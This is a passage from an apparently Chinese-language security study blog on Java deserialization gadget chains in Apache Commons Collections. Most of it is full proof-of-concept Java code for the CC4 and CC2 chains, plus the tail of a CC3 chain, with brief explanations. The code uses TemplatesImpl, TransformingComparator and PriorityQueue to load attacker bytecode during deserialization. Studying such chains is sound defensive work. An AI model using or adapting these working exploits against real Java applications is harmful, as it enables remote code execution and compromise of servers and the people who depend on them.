        <span class="token class-name">Constructor</span> ctor <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctor<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> o <span class="token operator">=</span> ctor<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token class-name">Target</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>map1<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        serialize(o);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC3.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>最后流程图借用下别人的</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721188304998-2f1ec2bb-9c55-402c-b27e-d2c2c4eff542.png"></p>
<p>出去这几条链之外，还有CC2、CC4、CC5、CC7、CC11这几条链子，但跟上几条都差不多，基本都是换了入口类，或者换了执行命令或者执行代码的方法。</p>
<h2 id="其他链子"><a href="#其他链子" class="headerlink" title="其他链子"></a>其他链子</h2><p>先给出所有的流程图<img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721271474253-39a8f86a-3f40-410d-a819-a9303cb3fb98.png"></p>
<h3 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h3><p>先贴个POC</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC4</span><span class="token punctuation">;</span>


<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span></span><span class="token class-name">Transformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ChainedTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InstantiateTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TrAXFilter</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">TransformerConfigurationException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyCC4</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">InstantiationException</span><span class="token punctuation">,</span> <span class="token class-name">TransformerConfigurationException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> names <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        names<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        names<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test1 <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>test1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token keyword">new</span> <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>templates<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// Explicitly specify the types for TransformingComparator</span>
        <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// Add elements to the queue to trigger the transformation</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Add dummy elements</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Class</span> cz <span class="token operator">=</span> transformingComparator<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> czField <span class="token operator">=</span> cz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"transformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        czField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        czField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">,</span> chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>


<span class="token comment">//        serialize(queue);</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC4.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC4.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span> ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这条链子中改变的是InvokerTransformer中的transform方法修改为TransformingComparator，方法中的compare方法，在这个方法中调用了transform方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721220820894-c3b4b897-39af-484f-a507-c8e2e3ef7320.png"></p>
<p>然后在PriorityQueue类中存在siftDownUsingComparator方法，这个方法中调用了compare方法</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1721221060711-77d9130e-2abd-4763-88d0-7715e391009f.png"></p>
<p>通过这个类来调用transform方法，链子就成了</p>
<h3 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h3><p>cc2就是在cc4的基础上将InstantiateTransformer和TrAXFilter.class换成了InvokerTransformer的transform方法，来调用TemplateIpl来完成命令执行，就只是把cc4的中间部分改变了。</p>
<p>POC如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC2</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>comparators<span class="token punctuation">.</span></span><span class="token class-name">TransformingComparator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">ConstantTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>collections4<span class="token punctuation">.</span>functors<span class="token punctuation">.</span></span><span class="token class-name">InvokerTransformer</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">POC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NoSuchFieldException</span><span class="token punctuation">,</span> <span class="token class-name">IllegalAccessException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> templates <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> names <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        names<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        names<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> bytecodes <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_bytecodes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> test1 <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\MyCC3\\Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> codes <span class="token operator">=</span> <span class="token punctuation">&#123;</span>test1<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
        bytecodes<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> codes<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> tfactory <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"_tfactory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        tfactory<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>templates<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        
        <span class="token class-name">InvokerTransformer</span> invokerTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span><span class="token string">"newTransformer"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">TransformingComparator</span> transformingComparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TransformingComparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">)</span><span class="token punctuation">;</span>

        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">/*需要注意的点是这里，在CC4当中是，我们是对数组进行操作，但是，在此处我么不对数组进行操作了，而且需要传进去template去*/</span>
        queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">Class</span> cz <span class="token operator">=</span> transformingComparator<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Field</span> czField <span class="token operator">=</span> cz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"transformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        czField<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        czField<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>transformingComparator<span class="token punctuation">,</span> invokerTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">serialize</span><span class="token punctuation">(</span>queue<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"MyPOC2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"MyPOC2.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

